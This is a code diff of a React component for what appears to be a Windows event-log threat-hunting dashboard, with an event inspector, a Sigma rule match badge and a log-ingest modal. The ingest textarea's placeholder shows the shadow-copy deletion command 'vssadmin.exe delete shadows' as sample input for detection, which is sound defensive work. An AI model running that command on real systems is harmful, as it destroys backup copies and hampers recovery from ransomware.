-              {Object.entries(selectedRecord.eventData).map(([k, v]) => (
-                <div key={k} className="p-2 bg-black border border-neutral-900 text-xs">
-                  <div className="text-[9px] text-neutral-500 font-bold uppercase">{k}</div>
-                  <div className="text-cyan-300 break-all select-all font-mono text-[11px] mt-0.5">{v}</div>
+        {/* Right Column: Selected Event Inspector & Sigma Rule Attribution */}
+        <div className="lg:col-span-5 flex flex-col h-full bg-neutral-950 overflow-y-auto p-4 space-y-4">
+          {selectedRecord ? (
+            <>
+              {/* Event Header Card */}
+              <div className="p-3 bg-black border border-neutral-800 space-y-2">
+                <div className="flex items-center justify-between border-b border-neutral-800 pb-1.5">
+                  <div className="flex items-center gap-2">
+                    <span className="text-cyan-400 font-bold text-xs">EVENT ID {selectedRecord.eventId}</span>
+                    <span className="text-neutral-600">//</span>
+                    <span className="text-neutral-400 text-xs">{selectedRecord.channel}</span>
+                  </div>
+                  <span className={`text-[9px] px-1.5 py-0.2 font-bold ${
+                    selectedRecord.severity === 'CRITICAL' ? 'text-rose-400' : 'text-neutral-400'
+                  }`}>
+                    {selectedRecord.severity}
+                  </span>
                 </div>
-              ))}
-            </div>
-          </div>
 
-          {/* Sigma Rule Details if matched */}
-          {selectedRecord.sigmaRuleMatched && (() => {
-            const rule = SIGMA_RULES.find(r => selectedRecord.sigmaRuleMatched?.includes(r.id));
-            if (!rule) return null;
-            return (
-              <div className="p-2.5 bg-rose-950/20 border border-rose-700 text-xs space-y-1">
-                <div className="font-bold text-rose-400 flex items-center gap-1 text-[11px]">
-                  <span>⚡ MATCHED SIGMA RULE:</span>
-                  <span>{rule.title}</span>
+                <div className="text-xs font-bold text-white leading-snug">
+                  {selectedRecord.title}
                 </div>
-                <div className="text-[10px] text-neutral-400">{rule.description}</div>
-                <div className="p-1.5 bg-black border border-rose-900 text-[9px] text-rose-300 font-mono">
-                  {rule.detectionCondition}
+
+                <p className="text-[11px] text-neutral-400 leading-relaxed">
+                  {selectedRecord.description}
+                </p>
+
+                <div className="pt-2 border-t border-neutral-800 flex justify-between text-[10px] text-neutral-500">
+                  <span>TIME: {selectedRecord.timestamp}</span>
+                  <span>MITRE: <strong className="text-rose-400">{selectedRecord.mitreTechnique}</strong></span>
                 </div>
               </div>
-            );
-          })()}
 
-          {/* Actions */}
-          <div className="pt-2 border-t border-neutral-800">
-            <button
-              onClick={() => handleCopy(JSON.stringify(selectedRecord, null, 2))}
-              className="w-full py-1.5 bg-neutral-900 hover:bg-neutral-800 border border-neutral-700 text-neutral-200 hover:text-white text-xs font-bold flex items-center justify-center gap-1.5 cursor-pointer"
-            >
-              {copiedText ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
-              <span>{copiedText ? 'COPIED EVENT JSON' : 'COPY EVENT JSON'}</span>
-            </button>
-          </div>
+              {/* Sigma Rule Match Badge */}
+              {selectedRecord.sigmaRuleMatched && (
+                <div className="p-3 bg-rose-950/30 border border-rose-600 text-rose-200 space-y-1">
+                  <div className="flex items-center gap-2 text-xs font-bold">
+                    <Flame className="w-4 h-4 text-rose-400" />
+                    <span>SIGMA RULE TRIGGERED</span>
+                  </div>
+                  <div className="text-[11px] font-mono font-bold text-white">
+                    {selectedRecord.sigmaRuleMatched}
+                  </div>
+                  <p className="text-[10px] text-rose-300/80 leading-relaxed">
+                    Correlated against rule baseline. Indicator represents living-off-the-land adversary activity.
+                  </p>
+                </div>
+              )}
+
+              {/* Raw Event Data Fields */}
+              <div className="border border-neutral-800 bg-black p-3 space-y-2">
+                <div className="flex items-center justify-between text-[11px] font-bold text-neutral-400 border-b border-neutral-800 pb-1">
+                  <span>EVENTDATA KEY-VALUE PAIRS</span>
+                  <button
+                    onClick={() => handleCopy(JSON.stringify(selectedRecord.eventData, null, 2))}
+                    className="text-[10px] text-neutral-500 hover:text-white flex items-center gap-1 cursor-pointer"
+                  >
+                    {copiedText ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                    <span>{copiedText ? 'COPIED' : 'COPY JSON'}</span>
+                  </button>
+                </div>
+
+                <div className="space-y-1.5 text-xs font-mono">
+                  {Object.entries(selectedRecord.eventData).map(([k, v]) => (
+                    <div key={k} className="p-1.5 bg-neutral-950 border border-neutral-900">
+                      <div className="text-[9px] text-neutral-500">{k}</div>
+                      <div className="text-neutral-200 text-[10px] break-all select-all mt-0.5">{v}</div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            </>
+          ) : (
+            <div className="p-8 text-center text-xs text-neutral-600 border border-dashed border-neutral-800">
+              Select an event record to inspect attributes.
+            </div>
+          )}
         </div>
       </div>
+
+      {/* Paste / Ingest Modal */}
+      {showIngestModal && (
+        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+          <div className="w-full max-w-2xl bg-neutral-950 border border-neutral-700 p-4 space-y-3 shadow-2xl">
+            <div className="flex items-center justify-between border-b border-neutral-800 pb-2">
+              <span className="text-xs font-bold text-white flex items-center gap-2 uppercase">
+                <FileCode className="w-4 h-4 text-amber-400" />
+                <span>INGEST WINDOWS EVENT LOG DATA (XML / JSON / TEXT)</span>
+              </span>
+              <button
+                onClick={() => setShowIngestModal(false)}
+                className="text-neutral-500 hover:text-white text-xs cursor-pointer"
+              >
+                ✕
+              </button>
+            </div>
+
+            <p className="text-[10px] text-neutral-400 leading-relaxed">
+              Paste XML exported from Windows Event Viewer, JSON from PowerShell (`Get-WinEvent | ConvertTo-Json`), or raw log lines. The engine will parse Event IDs, command lines, and test against live Sigma detection rules.
+            </p>
+
+            <textarea
+              rows={10}
+              value={rawLogInput}
+              onChange={(e) => setRawLogInput(e.target.value)}
+              placeholder='<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"> ... </Event> or [{"EventId": 4688, "CommandLine": "vssadmin.exe delete shadows"}]'
+              className="w-full p-2.5 bg-black border border-neutral-800 text-white font-mono text-xs focus:border-amber-500 focus:outline-none"
+            />
+
+            <div className="flex justify-end gap-2 pt-2 border-t border-neutral-800">
+              <button
+                onClick={() => setShowIngestModal(false)}
+                className="px-3 py-1 bg-neutral-900 text-neutral-400 hover:text-white text-xs cursor-pointer"
+              >
+                Cancel
+              </button>
+              <button
+                onClick={handleProcessRawInput}
+                className="px-3 py-1 bg-amber-600 hover:bg-amber-500 text-black font-bold text-xs cursor-pointer"
+              >
+                PARSE & AUDIT LOGS
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
